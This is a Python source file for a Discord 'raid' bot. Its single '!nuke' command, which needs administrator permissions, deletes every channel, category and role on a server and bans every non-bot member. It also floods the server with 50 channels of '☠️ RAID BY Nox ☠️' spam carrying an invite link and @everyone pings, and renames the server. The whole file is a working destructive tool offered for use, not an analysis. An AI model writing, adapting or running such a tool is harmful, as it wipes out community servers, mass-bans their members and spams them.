import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        print("Pas les permissions.")
        return

    guild = ctx.guild

    async def delete_channels_and_categories():
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Supprimé : {channel.name}")
            except Exception as e:
                print(f"Erreur suppression {channel.name}: {str(e)}")

        for category in guild.categories:
            try:
                await category.delete()
                print(f"Catégorie supprimée : {category.name}")
            except Exception as e:
                print(f"Erreur suppression catégorie {category.name}: {str(e)}")

    async def delete_roles():
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"Rôle supprimé : {role.name}")
                except Exception as e:
                    print(f"Erreur suppression rôle {role.name}: {str(e)}")

    async def create_channels_and_spam():
        for _ in range(50):
            try:
                channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
                print(f"Salon créé : {channel.name}")
                for _ in range(5):
                    try:
                        await channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone")
                    except Exception as e:
                        print(f"Erreur envoi message : {str(e)}")
            except Exception as e:
                print(f"Erreur création salon : {str(e)}")

    async def rename_server():
        try:
            await guild.edit(name="☠️ RAID BY Nox ☠️")
            print("Serveur renommé.")
        except Exception as e:
            print(f"Erreur renommage serveur : {str(e)}")

    async def create_roles():
        for i in range(30):
            try:
                await guild.create_role(name="☠️ RAID BY Nox ☠️")
                print(f"Rôle {i+1} créé.")
            except Exception as e:
                print(f"Erreur création rôle {i+1}: {str(e)}")

    async def ban_members():
        for member in guild.members:
            if not member.bot:
                try:
                    await member.ban(reason="☠️ RAID BY Nox ☠️")
                    print(f"{member.name} banni.")
                except Exception as e:
                    print(f"Erreur ban {member.name}: {str(e)}")

    try:
        await delete_channels_and_categories()
        await delete_roles()
        await create_channels_and_spam()
        await rename_server()
        await create_roles()
        await ban_members()
        print("Nuke terminé.")
    except Exception as e:
        print(f"Erreur générale : {str(e)}")

bot.run(os.getenv("TOKEN"))
